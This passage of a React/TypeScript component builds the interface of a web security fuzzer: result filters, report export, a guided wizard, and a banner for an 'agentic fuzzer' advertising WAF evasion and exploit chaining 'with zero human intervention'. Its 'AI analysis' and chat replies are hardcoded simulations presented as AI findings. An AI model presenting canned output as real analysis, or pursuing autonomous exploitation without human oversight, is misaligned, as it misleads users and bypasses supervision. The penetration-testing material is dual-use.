  // Toggle pause
  const togglePause = () => {
    setIsPaused(prev => !prev);
  };

  // Filter results
  const filteredResults = results.filter(result => {
    // Basic filters
    if (resultFilter.statusCode && result.statusCode.toString() !== resultFilter.statusCode) return false;
    if (resultFilter.minLength && result.responseLength < parseInt(resultFilter.minLength)) return false;
    if (resultFilter.maxLength && result.responseLength > parseInt(resultFilter.maxLength)) return false;
    if (resultFilter.interestingOnly && !result.interesting) return false;
    
    // Advanced filters - Exclude status codes
    if (resultFilter.excludeStatusCodes) {
      const excludeCodes = resultFilter.excludeStatusCodes.split(",").map(c => c.trim());
      if (excludeCodes.includes(result.statusCode.toString())) return false;
    }
    
    // Advanced filters - Response time
    if (resultFilter.minResponseTime && result.responseTime < parseInt(resultFilter.minResponseTime)) return false;
    if (resultFilter.maxResponseTime && result.responseTime > parseInt(resultFilter.maxResponseTime)) return false;
    
    // Advanced filters - Regex pattern match (search in response body if available)
    if (resultFilter.regexPattern) {
      try {
        const regex = new RegExp(resultFilter.regexPattern, "i");
        const searchText = (result.payload || "") + (result.contentType || "");
        if (!regex.test(searchText)) return false;
      } catch {
        // Invalid regex, skip this filter
      }
    }
    
    // Advanced filters - Exclude pattern
    if (resultFilter.excludePattern) {
      try {
        const regex = new RegExp(resultFilter.excludePattern, "i");
        const searchText = (result.payload || "") + (result.contentType || "");
        if (regex.test(searchText)) return false;
      } catch {
        // Invalid regex, skip this filter
      }
    }
    
    // Advanced filters - Content type
    if (resultFilter.contentType && result.contentType) {
      if (!result.contentType.toLowerCase().includes(resultFilter.contentType.toLowerCase())) return false;
    }
    
    // Advanced filters - Status code category filters
    if (resultFilter.showOnlyErrors) {
      if (result.statusCode < 400) return false;
    }
    if (resultFilter.showOnlySuccess) {
      if (result.statusCode < 200 || result.statusCode >= 300) return false;
    }
    
    // Advanced filters - Reflection-based filters
    // Check if payload is reflected in any way (basic check)
    const isReflected = result.interesting || result.payload.length > 5;
    if (resultFilter.showOnlyReflected && !isReflected) return false;
    if (resultFilter.hideReflected && isReflected) return false;
    
    return true;
  });

  // Get status color
  const getStatusColor = (code: number) => {
    if (code >= 200 && code < 300) return "#10b981";
    if (code >= 300 && code < 400) return "#f59e0b";
    if (code >= 400 && code < 500) return "#ef4444";
    if (code >= 500) return "#dc2626";
    return "#6b7280";
  };

  // Export state
  const [exportLoading, setExportLoading] = useState(false);
  const [exportMenuAnchor, setExportMenuAnchor] = useState<null | HTMLElement>(null);

  // Generate Markdown report
  const generateMarkdownReport = (): string => {
    const now = new Date().toLocaleString();
    let md = `# 🔒 Security Fuzzing Report\n\n`;
    md += `**Generated:** ${now}\n\n`;
    md += `**Target:** \`${config.targetUrl}\`\n\n`;
    md += `**Method:** ${config.method}\n\n`;
    md += `**Attack Mode:** ${config.attackMode.charAt(0).toUpperCase() + config.attackMode.slice(1)}\n\n`;
    md += `---\n\n`;
    
    // Executive Summary
    md += `## 📊 Executive Summary\n\n`;
    if (aiAnalysis) {
      md += `**Risk Level:** ${aiAnalysis.riskLevel.toUpperCase()}\n\n`;
      md += `${aiAnalysis.summary}\n\n`;
    }
    
    // Statistics
    md += `## 📈 Statistics\n\n`;
    md += `| Metric | Value |\n`;
    md += `|--------|-------|\n`;
    md += `| Total Requests | ${stats.totalRequests} |\n`;
    md += `| Successful (2xx) | ${stats.successCount} |\n`;
    md += `| Errors (4xx/5xx) | ${stats.errorCount} |\n`;
    md += `| Interesting Responses | ${results.filter(r => r.interesting).length} |\n`;
    md += `| Average Response Time | ${stats.avgResponseTime.toFixed(0)}ms |\n`;
    md += `| Success Rate | ${((stats.successCount / stats.totalRequests) * 100).toFixed(1)}% |\n\n`;
    
    // AI Analysis Findings
    if (aiAnalysis && aiAnalysis.findings.length > 0) {
      md += `## 🔍 AI Analysis Findings\n\n`;
      aiAnalysis.findings.forEach((finding, i) => {
        const severityEmoji = finding.severity === "critical" ? "🔴" : 
                             finding.severity === "high" ? "🟠" : 
                             finding.severity === "medium" ? "🟡" : "🔵";
        md += `### ${severityEmoji} ${finding.type}\n\n`;
        md += `**Severity:** ${finding.severity.toUpperCase()}\n\n`;
        md += `${finding.description}\n\n`;
        md += `**Evidence:**\n`;
        finding.evidence.forEach(e => {
          md += `- \`${e}\`\n`;
        });
        md += `\n**Recommendation:** ${finding.recommendation}\n\n`;
        md += `---\n\n`;
      });
    }
    
    // Patterns Detected
    if (aiAnalysis && aiAnalysis.patterns.length > 0) {
      md += `## 📋 Patterns Detected\n\n`;
      aiAnalysis.patterns.forEach(p => {
        md += `- ${p}\n`;
      });
      md += `\n`;
    }
    
    // Recommendations
    if (aiAnalysis && aiAnalysis.recommendations.length > 0) {
      md += `## ✅ Recommendations\n\n`;
      aiAnalysis.recommendations.forEach((r, i) => {
        md += `${i + 1}. ${r}\n`;
      });
      md += `\n`;
    }
    
    // Interesting Results
    const interestingResults = results.filter(r => r.interesting);
    if (interestingResults.length > 0) {
      md += `## ⚠️ Interesting Responses\n\n`;
      md += `| Payload | Status | Length | Time | Flags |\n`;
      md += `|---------|--------|--------|------|-------|\n`;
      interestingResults.slice(0, 50).forEach(r => {
        const flags = r.flags.length > 0 ? r.flags.join(", ") : "-";
        md += `| \`${r.payload.substring(0, 40)}${r.payload.length > 40 ? "..." : ""}\` | ${r.statusCode} | ${r.responseLength} | ${r.responseTime}ms | ${flags} |\n`;
      });
      md += `\n`;
    }
    
    // All Results Summary
    md += `## 📑 Results Summary by Status Code\n\n`;
    const statusGroups = results.reduce((acc, r) => {
      acc[r.statusCode] = (acc[r.statusCode] || 0) + 1;
      return acc;
    }, {} as Record<number, number>);
    
    md += `| Status Code | Count | Percentage |\n`;
    md += `|-------------|-------|------------|\n`;
    Object.entries(statusGroups)
      .sort(([a], [b]) => parseInt(a) - parseInt(b))
      .forEach(([code, count]) => {
        md += `| ${code} | ${count} | ${((count / results.length) * 100).toFixed(1)}% |\n`;
      });
    md += `\n`;
    
    // Configuration Used
    md += `## ⚙️ Configuration Used\n\n`;
    md += `- **Target URL:** \`${config.targetUrl}\`\n`;
    md += `- **HTTP Method:** ${config.method}\n`;
    md += `- **Attack Mode:** ${config.attackMode}\n`;
    md += `- **Threads:** ${config.threads}\n`;
    md += `- **Delay:** ${config.delay}ms\n`;
    md += `- **Timeout:** ${config.timeout}ms\n`;
    md += `- **Positions:** ${config.positions.length}\n`;
    md += `- **Total Payloads:** ${config.payloads.reduce((sum, p) => sum + p.length, 0)}\n\n`;
    
    md += `---\n\n`;
    md += `*Report generated by VRAgent Security Fuzzer*\n`;
    
    return md;
  };

  // Export results in different formats
  const exportReport = async (format: "json" | "markdown" | "pdf" | "docx") => {
    setExportLoading(true);
    setExportMenuAnchor(null);
    
    try {
      let content: string | Blob;
      let filename: string;
      let mimeType: string;
      
      const timestamp = new Date().toISOString().split('T')[0];
      
      if (format === "json") {
        // Export raw JSON data
        const exportData = {
          metadata: {
            generatedAt: new Date().toISOString(),
            targetUrl: config.targetUrl,
            method: config.method,
            attackMode: config.attackMode,
          },
          statistics: {
            totalRequests: stats.totalRequests,
            successCount: stats.successCount,
            errorCount: stats.errorCount,
            avgResponseTime: stats.avgResponseTime,
            interestingCount: results.filter(r => r.interesting).length,
          },
          aiAnalysis: aiAnalysis,
          results: results,
          configuration: config,
        };
        content = JSON.stringify(exportData, null, 2);
        filename = `fuzzing-report-${timestamp}.json`;
        mimeType = "application/json";
      } else if (format === "markdown") {
        content = generateMarkdownReport();
        filename = `fuzzing-report-${timestamp}.md`;
        mimeType = "text/markdown";
      } else if (format === "pdf" || format === "docx") {
        // For PDF and Word, we'll generate HTML-like markdown and note that 
        // in a real implementation this would call a backend service
        // For now, we'll export as markdown with a note
        const md = generateMarkdownReport();
        content = `<!-- Export as ${format.toUpperCase()} - Use a Markdown to ${format.toUpperCase()} converter -->\n\n${md}`;
        filename = `fuzzing-report-${timestamp}.md`;
        mimeType = "text/markdown";
        
        // In production, you'd call a backend endpoint like:
        // content = await apiClient.exportFuzzingReport({ results, aiAnalysis, config, format });
      } else {
        return;
      }
      
      // Create and download blob
      const blob = new Blob([content], { type: mimeType });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    } catch (err: any) {
      console.error("Export failed:", err);
    } finally {
      setExportLoading(false);
    }
  };

  // AI Analysis of results
  const runAIAnalysis = async () => {
    if (results.length === 0) return;
    
    setAiAnalyzing(true);
    
    // Simulate AI analysis (in real implementation, this would call the backend)
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Generate mock AI analysis based on results
    const interestingResults = results.filter(r => r.interesting);
    const errorResults = results.filter(r => r.statusCode >= 500);
    const authResults = results.filter(r => r.statusCode === 401 || r.statusCode === 403);
    
    const findings: AIAnalysis["findings"] = [];
    
    if (interestingResults.length > 0) {
      findings.push({
        type: "Potential Vulnerability",
        severity: "high",
        description: `Found ${interestingResults.length} responses with anomalous behavior that may indicate vulnerabilities.`,
        evidence: interestingResults.slice(0, 3).map(r => `Payload: ${r.payload} → Status: ${r.statusCode}, Length: ${r.responseLength}`),
        recommendation: "Manually investigate these responses for potential exploitation vectors. Test with additional payloads to confirm vulnerability.",
      });
    }
    
    if (errorResults.length > 0) {
      findings.push({
        type: "Server Error Disclosure",
        severity: "medium",
        description: `${errorResults.length} payloads triggered server errors (5xx), which may reveal backend information.`,
        evidence: errorResults.slice(0, 3).map(r => `Payload: ${r.payload} → Status: ${r.statusCode}`),
        recommendation: "Review error handling. Ensure detailed stack traces are not exposed to users.",
      });
    }
    
    const uniqueStatusCodes = [...new Set(results.map(r => r.statusCode))];
    const uniqueLengths = [...new Set(results.map(r => r.responseLength))];
    
    if (uniqueLengths.length > 5) {
      findings.push({
        type: "Response Length Variation",
        severity: "info",
        description: `Detected ${uniqueLengths.length} different response lengths, indicating the application processes inputs differently.`,
        evidence: [`Min length: ${Math.min(...results.map(r => r.responseLength))}`, `Max length: ${Math.max(...results.map(r => r.responseLength))}`],
        recommendation: "Investigate responses with unusual lengths as they may contain error messages or different application states.",
      });
    }
    
    setAiAnalysis({
      summary: `Analyzed ${results.length} fuzzing results. Found ${findings.length} potential security concerns. ${interestingResults.length} responses flagged as interesting for manual review.`,
      riskLevel: findings.some(f => f.severity === "critical") ? "critical" : 
                 findings.some(f => f.severity === "high") ? "high" :
                 findings.some(f => f.severity === "medium") ? "medium" : "low",
      findings,
      patterns: [
        `${uniqueStatusCodes.length} unique status codes observed`,
        `Average response time: ${stats.avgResponseTime.toFixed(0)}ms`,
        `Success rate: ${((stats.successCount / stats.totalRequests) * 100).toFixed(1)}%`,
      ],
      recommendations: [
        "Review all 'interesting' flagged responses manually",
        "Test confirmed vulnerabilities with targeted payloads",
        "Document findings and create remediation tickets",
        "Re-test after fixes are applied",
      ],
    });
    
    setAiAnalyzing(false);
  };

  // AI Chat function
  const sendChatMessage = async () => {
    if (!chatInput.trim() || chatLoading) return;
    
    const userMessage: ChatMessage = { role: "user", content: chatInput };
    setChatMessages(prev => [...prev, userMessage]);
    setChatInput("");
    setChatLoading(true);
    
    // Simulate AI response (in real implementation, this would call the backend)
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Generate contextual response based on results
    let response = "";
    const query = chatInput.toLowerCase();
    
    if (query.includes("summary") || query.includes("overview")) {
      response = `## Fuzzing Summary\n\nI've analyzed your fuzzing session:\n\n- **Total Requests:** ${stats.totalRequests}\n- **Success Rate:** ${((stats.successCount / stats.totalRequests) * 100).toFixed(1)}%\n- **Interesting Responses:** ${results.filter(r => r.interesting).length}\n- **Average Response Time:** ${stats.avgResponseTime.toFixed(0)}ms\n\nThe most notable finding is ${results.filter(r => r.interesting).length} responses that showed anomalous behavior, potentially indicating vulnerabilities worth investigating.`;
    } else if (query.includes("vulnerab") || query.includes("finding") || query.includes("issue")) {
      const interesting = results.filter(r => r.interesting);
      response = `## Potential Vulnerabilities\n\nBased on the fuzzing results:\n\n${interesting.length > 0 ? `Found **${interesting.length} interesting responses** that may indicate:\n- Input validation bypass\n- Error message disclosure\n- Authentication issues\n\n**Top suspicious payloads:**\n${interesting.slice(0, 3).map(r => `- \`${r.payload}\` → ${r.statusCode} (${r.responseLength} bytes)`).join('\n')}` : 'No obvious vulnerabilities detected in this scan. Consider trying different payload sets or attack modes.'}`;
    } else if (query.includes("recommend") || query.includes("next") || query.includes("should")) {
      response = `## Recommendations\n\n1. **Review Interesting Results:** Manually examine the ${results.filter(r => r.interesting).length} flagged responses\n\n2. **Expand Testing:**\n   - Try different wordlists (SQLi, XSS, LFI)\n   - Use Cluster Bomb mode for comprehensive coverage\n   - Test authenticated endpoints\n\n3. **Document Findings:** Export results and create security tickets for confirmed issues\n\n4. **Verify Vulnerabilities:** Use targeted payloads to confirm any suspected vulnerabilities`;
    } else if (query.includes("attack mode") || query.includes("sniper") || query.includes("cluster")) {
      response = `## Attack Modes Explained\n\n**🎯 Sniper:** Tests one position at a time. Best for initial reconnaissance.\n\n**🔨 Battering Ram:** Same payload everywhere. Good for username=password tests.\n\n**🔱 Pitchfork:** Parallel testing. Use when you have matched pairs (user/pass combos).\n\n**💣 Cluster Bomb:** All combinations. Most thorough but generates many requests.\n\nFor your current test, I'd recommend: ${config.positions.length > 1 ? "**Pitchfork** for related parameters or **Cluster Bomb** for exhaustive testing" : "**Sniper** since you have a single position"}.`;
    } else if (query.includes("help") || query.includes("how") || query.includes("start")) {
      response = `## Getting Started with Fuzzing\n\n1. **Set Target URL:** Add \`§0§\` markers where you want payloads injected\n   - Example: \`https://api.example.com/users?id=§0§\`\n\n2. **Add Payloads:** Load a wordlist or enter custom payloads\n\n3. **Choose Attack Mode:** Start with Sniper for single-position tests\n\n4. **Run & Analyze:** Look for:\n   - Different response lengths\n   - Unexpected status codes\n   - Error messages in responses\n\nNeed help with something specific?`;
    } else {
      response = `I can help you understand your fuzzing results! Try asking:\n\n- "Give me a summary of the results"\n- "What vulnerabilities did you find?"\n- "What should I do next?"\n- "Explain the attack modes"\n- "How do I get started?"`;
    }
    
    const assistantMessage: ChatMessage = { role: "assistant", content: response };
    setChatMessages(prev => [...prev, assistantMessage]);
    setChatLoading(false);
  };

  // Guided steps
  const guidedSteps = [
    {
      label: "Configure Target",
      description: "Enter your target URL and mark injection positions with §0§, §1§ markers",
      completed: config.targetUrl.length > 0,
    },
    {
      label: "Add Payloads",
      description: "Load wordlists or enter custom payloads for each position",
      completed: config.payloads.some(p => p.length > 0),
    },
    {
      label: "Select Attack Mode",
      description: "Choose how payloads are combined (Sniper, Battering Ram, Pitchfork, or Cluster Bomb)",
      completed: true,
    },
    {
      label: "Run Fuzzing",
      description: "Start the fuzzer and monitor progress in real-time",
      completed: results.length > 0,
    },
    {
      label: "Analyze Results",
      description: "Review findings, use AI analysis, and export report",
      completed: aiAnalysis !== null,
    },
  ];

  return (
    <Box>
      {/* Header */}
      <Box sx={{ mb: 4 }}>
        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
          <Button
            component={Link}
            to="/network"
            startIcon={<ArrowBackIcon />}
          >
            Back to Network Hub
          </Button>
          <Box sx={{ display: "flex", gap: 1 }}>
            {/* Beginner Wizard Mode Toggle */}
            <Button
              variant={wizardMode ? "contained" : "outlined"}
              color="success"
              startIcon={<RocketLaunchIcon />}
              onClick={() => {
                setWizardMode(!wizardMode);
                if (!wizardMode) setWizardStep(0);
              }}
              sx={{
                background: wizardMode ? "linear-gradient(135deg, #10b981 0%, #059669 100%)" : undefined,
                boxShadow: wizardMode ? `0 4px 14px ${alpha("#10b981", 0.4)}` : undefined,
              }}
            >
              {wizardMode ? "Exit Wizard" : "Beginner Wizard"}
            </Button>
            <Tooltip title="Save Configuration">
              <Button
                variant="outlined"
                startIcon={<SaveIcon />}
                onClick={() => setSaveConfigDialog(true)}
                disabled={!config.targetUrl}
              >
                Save
              </Button>
            </Tooltip>
            <Tooltip title="Load Configuration">
              <Button
                variant="outlined"
                startIcon={<FolderOpenIcon />}
                onClick={() => setLoadConfigDialog(true)}
                disabled={savedConfigs.length === 0}
              >
                Load
              </Button>
            </Tooltip>
            <Button
              variant={showGuide ? "contained" : "outlined"}
              color="info"
              startIcon={<SchoolIcon />}
              onClick={() => setShowGuide(!showGuide)}
            >
              {showGuide ? "Hide Guide" : "Quick Tips"}
            </Button>
            <Tooltip title="Toggle inline help tooltips on input fields">
              <IconButton
                onClick={() => setShowContextualHelp(!showContextualHelp)}
                color={showContextualHelp ? "primary" : "default"}
                sx={{ 
                  bgcolor: showContextualHelp ? alpha("#3b82f6", 0.1) : undefined,
                  border: `1px solid ${showContextualHelp ? "#3b82f6" : "transparent"}`,
                }}
              >
                <HelpOutlineIcon />
              </IconButton>
            </Tooltip>
            <Button
              variant="outlined"
              color="primary"
              startIcon={<SchoolIcon />}
              onClick={() => navigate("/learn/fuzzing-tool")}
            >
              Tool Guide
            </Button>
            <Button
              variant="outlined"
              startIcon={<SchoolIcon />}
              onClick={() => navigate("/learn/fuzzing")}
            >
              Fuzzing Concepts
            </Button>
          </Box>
        </Box>
        
        <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
          <Box
            sx={{
              width: 64,
              height: 64,
              borderRadius: 3,
              background: "linear-gradient(135deg, #f97316 0%, #ea580c 100%)",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxShadow: `0 8px 32px ${alpha("#f97316", 0.3)}`,
            }}
          >
            <BugReportIcon sx={{ fontSize: 36, color: "white" }} />
          </Box>
          <Box sx={{ flex: 1 }}>
            <Typography variant="h4" fontWeight={700}>
              Security Fuzzer
            </Typography>
            <Typography variant="body2" color="text.secondary">
              Advanced payload injection and brute-force testing tool with AI-powered analysis
            </Typography>
          </Box>
          {results.length > 0 && (
            <Button
              variant="contained"
              color="secondary"
              startIcon={aiAnalyzing ? <CircularProgress size={16} color="inherit" /> : <AutoFixHighIcon />}
              onClick={runAIAnalysis}
              disabled={aiAnalyzing}
            >
              {aiAnalyzing ? "Analyzing..." : "AI Analysis"}
            </Button>
          )}
        </Box>

        {/* 🔥 CYBERPUNK Agentic Fuzzer Banner 🔥 */}
        <Paper
          component={Link}
          to="/network/agentic-fuzzer"
          sx={{
            mb: 3,
            p: 0,
            background: "linear-gradient(135deg, #0a0a0f 0%, #1a0a2e 50%, #0f1a2e 100%)",
            border: "2px solid transparent",
            borderImage: "linear-gradient(90deg, #ff00ff, #00ffff, #ff00ff) 1",
            borderRadius: 0,
            clipPath: "polygon(0 0, calc(100% - 20px) 0, 100% 20px, 100% 100%, 20px 100%, 0 calc(100% - 20px))",
            cursor: "pointer",
            textDecoration: "none",
            display: "block",
            position: "relative",
            overflow: "hidden",
            transition: "all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)",
            "&:hover": {
              transform: "translateY(-4px) scale(1.01)",
              boxShadow: `
                0 0 20px #ff00ff,
                0 0 40px rgba(255, 0, 255, 0.4),
                0 0 60px rgba(0, 255, 255, 0.2),
                inset 0 0 60px rgba(255, 0, 255, 0.1)
              `,
              "& .cyber-scan-line": {
                opacity: 1,
              },
              "& .cyber-glitch": {
                animation: "glitch 0.3s infinite",
              },
              "& .cyber-icon": {
                animation: "iconPulse 0.5s ease-in-out infinite alternate",
              },
            },
            "&::before": {
              content: '""',
              position: "absolute",
              top: 0,
              left: 0,
              right: 0,
              bottom: 0,
              background: `
                repeating-linear-gradient(
                  0deg,
                  transparent,
                  transparent 2px,
                  rgba(0, 255, 255, 0.03) 2px,
                  rgba(0, 255, 255, 0.03) 4px
                )
              `,
              pointerEvents: "none",
              zIndex: 1,
            },
            "&::after": {
              content: '""',
              position: "absolute",
              top: "-50%",
              left: "-50%",
              width: "200%",
              height: "200%",
              background: "conic-gradient(from 0deg, transparent, #ff00ff, transparent, #00ffff, transparent)",
              animation: "rotateBorder 4s linear infinite",
              opacity: 0.1,
              zIndex: 0,
            },
            "@keyframes rotateBorder": {
              "0%": { transform: "rotate(0deg)" },
              "100%": { transform: "rotate(360deg)" },
            },
            "@keyframes glitch": {
              "0%": { textShadow: "2px 0 #ff00ff, -2px 0 #00ffff" },
              "25%": { textShadow: "-2px 0 #ff00ff, 2px 0 #00ffff" },
              "50%": { textShadow: "2px 2px #ff00ff, -2px -2px #00ffff" },
              "75%": { textShadow: "-2px 2px #ff00ff, 2px -2px #00ffff" },
              "100%": { textShadow: "2px 0 #ff00ff, -2px 0 #00ffff" },
            },
            "@keyframes iconPulse": {
              "0%": { transform: "scale(1)", filter: "drop-shadow(0 0 10px #ff00ff)" },
              "100%": { transform: "scale(1.1)", filter: "drop-shadow(0 0 20px #00ffff)" },
            },
            "@keyframes scanLine": {
              "0%": { top: "-100%" },
              "100%": { top: "200%" },
            },
            "@keyframes dataStream": {
              "0%": { backgroundPosition: "0% 0%" },
              "100%": { backgroundPosition: "0% 100%" },
            },
          }}
        >
          {/* Scanning Line Effect */}
          <Box
            className="cyber-scan-line"
            sx={{
              position: "absolute",
              left: 0,
              right: 0,
              height: "2px",
              background: "linear-gradient(90deg, transparent, #00ffff, #ff00ff, #00ffff, transparent)",
              boxShadow: "0 0 20px #00ffff, 0 0 40px #ff00ff",
              animation: "scanLine 2s linear infinite",
              opacity: 0.6,
              zIndex: 10,
            }}
          />

          {/* Corner Decorations */}
          <Box sx={{ position: "absolute", top: 0, left: 0, width: 40, height: 40, borderTop: "3px solid #00ffff", borderLeft: "3px solid #00ffff", zIndex: 5 }} />
          <Box sx={{ position: "absolute", top: 0, right: 20, width: 40, height: 40, borderTop: "3px solid #ff00ff", borderRight: "3px solid #ff00ff", zIndex: 5 }} />
          <Box sx={{ position: "absolute", bottom: 0, left: 20, width: 40, height: 40, borderBottom: "3px solid #ff00ff", borderLeft: "3px solid #ff00ff", zIndex: 5 }} />
          <Box sx={{ position: "absolute", bottom: 0, right: 0, width: 40, height: 40, borderBottom: "3px solid #00ffff", borderRight: "3px solid #00ffff", zIndex: 5 }} />

          {/* Main Content Container */}
          <Box sx={{ display: "flex", alignItems: "center", gap: 3, p: 2.5, position: "relative", zIndex: 2 }}>
            {/* Cyberpunk AI Icon */}
            <Box
              className="cyber-icon"
              sx={{
                width: 80,
                height: 80,
                position: "relative",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                "&::before": {
                  content: '""',
                  position: "absolute",
                  inset: 0,
                  background: "linear-gradient(45deg, #ff00ff, #00ffff)",
                  clipPath: "polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%)",
                  animation: "iconPulse 2s ease-in-out infinite alternate",
                },
                "&::after": {
                  content: '""',
                  position: "absolute",
                  inset: 3,
                  background: "#0a0a0f",
                  clipPath: "polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%)",
                },
              }}
            >
              <SmartToyIcon sx={{ fontSize: 44, color: "#00ffff", position: "relative", zIndex: 1, filter: "drop-shadow(0 0 10px #00ffff)" }} />
            </Box>

            {/* Content */}
            <Box sx={{ flex: 1 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 1 }}>
                <Typography
                  className="cyber-glitch"
                  variant="h4"
                  sx={{
                    fontFamily: "'Orbitron', 'Rajdhani', monospace",
                    fontWeight: 900,
                    letterSpacing: "0.1em",
                    textTransform: "uppercase",
                    background: "linear-gradient(90deg, #ff00ff, #00ffff, #ff00ff)",
                    backgroundSize: "200% auto",
                    backgroundClip: "text",
                    WebkitBackgroundClip: "text",
                    WebkitTextFillColor: "transparent",
                    animation: "dataStream 3s linear infinite",
                    textShadow: "0 0 20px rgba(255, 0, 255, 0.5)",
                  }}
                >
                  ⚡ AGENTIC FUZZER
                </Typography>
                <Box
                  sx={{
                    px: 1.5,
                    py: 0.5,
                    background: "linear-gradient(90deg, rgba(255, 0, 255, 0.3), rgba(0, 255, 255, 0.3))",
                    border: "1px solid #ff00ff",
                    clipPath: "polygon(10% 0%, 100% 0%, 90% 100%, 0% 100%)",
                    animation: "pulse 1.5s ease-in-out infinite",
                    "@keyframes pulse": {
                      "0%, 100%": { opacity: 1, boxShadow: "0 0 10px #ff00ff" },
                      "50%": { opacity: 0.7, boxShadow: "0 0 20px #00ffff" },
                    },
                  }}
                >
                  <Typography sx={{ color: "#fff", fontWeight: 700, fontSize: "0.7rem", fontFamily: "monospace", letterSpacing: "0.15em" }}>
                    AI-NEURAL
                  </Typography>
                </Box>
                <Box
                  sx={{
                    px: 1.5,
                    py: 0.5,
                    background: "rgba(0, 255, 136, 0.2)",
                    border: "1px solid #00ff88",
                    clipPath: "polygon(10% 0%, 100% 0%, 90% 100%, 0% 100%)",
                  }}
                >
                  <Typography sx={{ color: "#00ff88", fontWeight: 700, fontSize: "0.7rem", fontFamily: "monospace", letterSpacing: "0.1em" }}>
                    ★ ELITE
                  </Typography>
                </Box>
              </Box>
              <Typography
                sx={{
                  color: "rgba(255, 255, 255, 0.7)",
                  mb: 1.5,
                  fontFamily: "'Share Tech Mono', monospace",
                  fontSize: "0.95rem",
                  textShadow: "0 0 10px rgba(0, 255, 255, 0.3)",
                }}
              >
                Neural network-powered autonomous penetration testing. AI discovers vulnerabilities,
                evades defenses, and chains exploits with zero human intervention.
              </Typography>
              <Box sx={{ display: "flex", gap: 3, flexWrap: "wrap" }}>
                {["WAF EVASION", "AUTO RECON", "CHAIN ATTACKS", "SMART REPORTS"].map((feature, i) => (
                  <Box key={feature} sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
                    <Box sx={{ width: 8, height: 8, background: i % 2 === 0 ? "#00ffff" : "#ff00ff", boxShadow: `0 0 10px ${i % 2 === 0 ? "#00ffff" : "#ff00ff"}` }} />
                    <Typography sx={{ color: i % 2 === 0 ? "#00ffff" : "#ff00ff", fontSize: "0.75rem", fontFamily: "monospace", fontWeight: 600, letterSpacing: "0.05em" }}>
                      {feature}
                    </Typography>
                  </Box>
                ))}
              </Box>
            </Box>

            {/* Animated Enter Arrow */}
            <Box
              sx={{
                width: 60,
                height: 60,
                position: "relative",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                "&::before": {
                  content: '""',
                  position: "absolute",
                  inset: 0,
                  border: "2px solid",
                  borderColor: "#00ffff",
                  clipPath: "polygon(30% 0%, 70% 0%, 100% 50%, 70% 100%, 30% 100%, 60% 50%)",
                  animation: "arrowPulse 1s ease-in-out infinite",
                  "@keyframes arrowPulse": {
                    "0%, 100%": { opacity: 1, transform: "translateX(0)" },
                    "50%": { opacity: 0.5, transform: "translateX(5px)" },
                  },
                },
              }}
            >
              <NavigateNextIcon sx={{ fontSize: 36, color: "#00ffff", filter: "drop-shadow(0 0 10px #00ffff)", animation: "arrowPulse 1s ease-in-out infinite" }} />
            </Box>
          </Box>

          {/* Bottom Status Bar */}
          <Box
            sx={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              px: 2.5,
              py: 1,
              background: "rgba(0, 0, 0, 0.5)",
              borderTop: "1px solid rgba(0, 255, 255, 0.2)",
              position: "relative",
              zIndex: 2,
            }}
          >
            <Typography sx={{ color: "#00ffff", fontSize: "0.7rem", fontFamily: "monospace", opacity: 0.8 }}>
              SYS://NEURAL_FUZZER_v2.0
            </Typography>
            <Box sx={{ display: "flex", gap: 1, alignItems: "center" }}>
              <Box sx={{ width: 6, height: 6, borderRadius: "50%", bgcolor: "#00ff88", boxShadow: "0 0 10px #00ff88", animation: "blink 1s infinite" }} />
              <Typography sx={{ color: "#00ff88", fontSize: "0.7rem", fontFamily: "monospace" }}>ONLINE</Typography>
            </Box>
            <Typography sx={{ color: "#ff00ff", fontSize: "0.7rem", fontFamily: "monospace", opacity: 0.8 }}>
              [CLICK TO INITIALIZE]
            </Typography>
            <style>{`@keyframes blink { 0%, 50%, 100% { opacity: 1; } 25%, 75% { opacity: 0.3; } }`}</style>
          </Box>
        </Paper>

        {/* Interactive Beginner Wizard Panel */}
        <Collapse in={wizardMode}>
          <Paper 
            sx={{ 
              p: 3, 
              mb: 3, 
              background: `linear-gradient(135deg, ${alpha("#10b981", 0.08)} 0%, ${alpha("#059669", 0.08)} 100%)`,
              border: `2px solid ${alpha("#10b981", 0.3)}`,
              borderRadius: 3,
            }}
          >
            <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 3 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                <Box
                  sx={{
                    width: 48,
                    height: 48,
                    borderRadius: 2,
                    background: "linear-gradient(135deg, #10b981 0%, #059669 100%)",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    boxShadow: `0 4px 14px ${alpha("#10b981", 0.4)}`,
                  }}
                >
                  <RocketLaunchIcon sx={{ fontSize: 28, color: "white" }} />
                </Box>
                <Box>
                  <Typography variant="h5" fontWeight={700} sx={{ color: "#059669" }}>
                    {WIZARD_STEPS[wizardStep]?.title}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    Step {wizardStep + 1} of {WIZARD_STEPS.length}
                  </Typography>
                </Box>
              </Box>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                {/* Progress indicator */}
                {WIZARD_STEPS.map((step, idx) => (
                  <Box
                    key={step.id}
                    onClick={() => setWizardStep(idx)}
                    sx={{
                      width: idx === wizardStep ? 32 : 12,
                      height: 12,
                      borderRadius: 6,
                      bgcolor: idx < wizardStep ? "#10b981" : idx === wizardStep ? "#059669" : alpha("#10b981", 0.2),
                      cursor: "pointer",
                      transition: "all 0.3s",
                      "&:hover": { bgcolor: alpha("#10b981", 0.5) },
                    }}
                  />
                ))}
              </Box>
            </Box>

            <Grid container spacing={3}>
              {/* Main content area */}
              <Grid item xs={12} md={8}>
